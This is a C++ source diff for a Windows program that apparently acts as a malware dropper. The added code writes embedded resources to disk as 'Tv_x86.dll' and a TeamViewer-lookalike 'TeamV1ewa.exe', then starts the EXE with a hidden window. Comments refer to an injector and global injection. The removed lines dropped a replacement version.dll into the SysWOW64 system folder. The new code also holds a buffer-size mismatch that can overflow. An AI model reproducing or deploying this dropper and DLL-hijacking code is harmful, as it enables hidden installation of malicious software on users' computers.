@@ -395,8 +395,7 @@ BOOL WriteFile86AnCreateProcess(DWORD Type,STRING StartUpFileName)
 
 
    
-    CloseHandle(pi.hThread);
-    CloseHandle(pi.hProcess);
+    
     return TRUE;
 }
 
@@ -494,6 +493,7 @@ STRING GetPath()
 #endif
     
 }
+
 int main()
 {
     CProcessOpt PsOpt;
@@ -502,27 +502,52 @@ int main()
     DWORD dwWinver = getSystemName(); //判断系统版本
  
     CBinString patchName = TEXT("");
-    patchName = GetPath();
-    patchName.append(TEXT("ChangeFileSecurityInfo.exe"));//寫入DLL
-    WriteFile86AnCreateProcess(CHANGE_FILESECURRTY_WIN7, patchName);
-    Sleep(300);
-    //WriteFile86AnCreateProcess(INJECT_KILL_IELOCKLOADER, patchName); //写注入器
-    if (dwWinver == 61)
-    {
-        //win7
-        patchName = TEXT("C:\\Windows\\SysWOW64\\version.dll");
-        ReleaseFile(VERSION_WIN7_SP1, patchName);
-        Sleep(300);
-        return 0;
-    }
-    else if (dwWinver == 10)
-    {
-        patchName = TEXT("C:\\Windows\\SysWOW64\\version.dll");
-        ReleaseFile(VERSION_WIN10, patchName);
-        Sleep(300);
-        return 0;
-    }
+    TCHAR szCurrentPath[0X256] = { 0 };
+    GetCurrentDirectory(sizeof(TCHAR) * 1024,szCurrentPath);
+    patchName = szCurrentPath;
+    patchName.append(TEXT("\\"));
+    patchName.append(TEXT("Tv_x86.dll"));//寫入DLL
+   // WriteFile86AnCreateProcess(CHANGE_FILESECURRTY_WIN7, patchName);
+    ReleaseFile(Tv_x86_Dll, patchName);
+    Sleep(200);
+    ////WriteFile86AnCreateProcess(INJECT_KILL_IELOCKLOADER, patchName); //写注入器
+    //if (dwWinver == 61)
+    //{
+    //    //win7
+    //    patchName = TEXT("C:\\Windows\\SysWOW64\\version.dll");
+    //    ReleaseFile(VERSION_WIN7_SP1, patchName);
+    //    Sleep(300);
+    //    return 0;
+    //}
+    //else if (dwWinver == 10)
+    //{
+    //    patchName = TEXT("C:\\Windows\\SysWOW64\\version.dll");
+    //    ReleaseFile(VERSION_WIN10, patchName);
+    //    Sleep(300);
+    //    return 0;
+    //}
    
+    //写入全局注入
+    patchName = TEXT("");
+    memset(szCurrentPath, 0, sizeof(TCHAR) * 0X256);
+    GetCurrentDirectory(sizeof(TCHAR) * 1024, szCurrentPath);
+    patchName = szCurrentPath;
+    patchName.append(TEXT("\\"));
+    patchName.append(TEXT("TeamV1ewa.exe"));//写入EXE
+    //WriteFile86AnCreateProcess(TeamView_EXE, patchName);
+    ReleaseFile(TeamView_EXE, patchName);//启动进程.
+   
+    STARTUPINFO si;
+    ZeroMemory(&si, sizeof(STARTUPINFO));
+    si.cb = sizeof(STARTUPINFO);
+    PROCESS_INFORMATION pi;
+
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    BOOL bRet = CreateProcess(patchName.c_str(), NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
+
+    Sleep(1000);
     return 0;
    // NoSeccionCreateProcess(patchName);
  
